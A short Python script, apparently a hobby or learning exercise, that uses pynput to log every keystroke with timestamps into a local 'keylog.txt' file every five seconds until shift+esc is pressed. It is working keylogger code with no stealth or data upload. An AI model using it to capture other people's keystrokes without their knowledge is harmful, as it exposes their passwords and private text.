# msvcrt only windows specific and for cli
# curses only for cli
# keyboard requires root in linux
# hence all above modules unsuitable

# pynput requires X Server in linux but workable

import pynput
import datetime
import threading

shift = False
# shift + esc is the exit code
logs = ''
# buffer for keylogs
stopTimer = False
# flag to stop the timer recursion

def log(filename):
    global logs, stopTimer
    with open(filename, 'a') as file:
        file.write(logs)
        logs = ''
    if not stopTimer:
        threading.Timer(interval=5.0, function=log, args=(filename, )).start()
    # no recursion error or MLE bcoz every thread has its own stack
    # every log() gets called in another thread
    # and once new thread timer has started, original gets terminated after log() returns

def on_press(key):
    global shift, logs
    # print('{} : {} pressed'.format(datetime.datetime.now(), key))
    logs = logs + '{} : {} pressed\n'.format(datetime.datetime.now(), key)
    if key == pynput.keyboard.Key.shift:
        # if shift pressed then set flag to true
        shift = True

def on_release(key):
    global shift, logs, stopTimer
    try:
        key.char
    except AttributeError as e:
        # print('{} : {} released'.format(datetime.datetime.now(), key))
        logs = logs + '{} : {} released\n'.format(datetime.datetime.now(), key)

    if key == pynput.keyboard.Key.esc and shift:
        # if esc released and flag is true
        # stop the listener thread
        keyboardListener.stop()
        stopTimer = True
        # indicate to stop the timer thread to exit the program
    if key == pynput.keyboard.Key.shift:
        # if shift released set flag false
        shift = False

filename = 'keylog.txt'

with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as keyboardListener:
    log(filename)
    keyboardListener.join()
    # continue when listener thread has finished executing
    # blocking thread